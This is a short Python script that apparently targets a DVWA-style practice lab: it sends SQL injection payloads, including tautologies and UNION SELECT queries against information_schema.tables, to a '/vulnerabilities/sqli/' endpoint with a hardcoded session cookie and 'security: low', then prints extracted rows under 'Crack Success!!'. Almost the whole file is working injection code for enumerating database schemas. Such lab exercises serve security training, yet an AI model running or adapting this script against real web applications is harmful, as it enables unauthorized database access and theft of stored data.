import requests
from bs4 import BeautifulSoup as bs
import urllib.parse

inject = ["1'or'1","1=1","1' union select table_schema from information_schema.tables #","1' union select table_schema,table_name from information_schema.tables #"]

for i in inject:
    URL="http://10.0.2.13:8080/vulnerabilities/sqli/?id="+urllib.parse.quote(i)+"&Submit=Submit#"

    cookie={
        "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
        "security":"low"
        }

    session1=requests.Session()
        
    res=session1.get(URL,cookies=cookie)
    html = res.text
    html_parser = bs(html, 'html.parser')
    try:
        vul_area = html_parser.find('div',{'class':'vulnerable_code_area'})
        pre = vul_area.findAll('pre')
        if(len(pre)>1):
            print("\n\n")
            print("Crack Success!!")
            print("\n\n")
            for j in pre:
                replace1 = str(j).replace("<br/>",",")
                replace2 = replace1.replace("<pre>","")
                replace3 = replace2.replace("</pre>","")
                print(replace3)
    except AttributeError:
        print("")
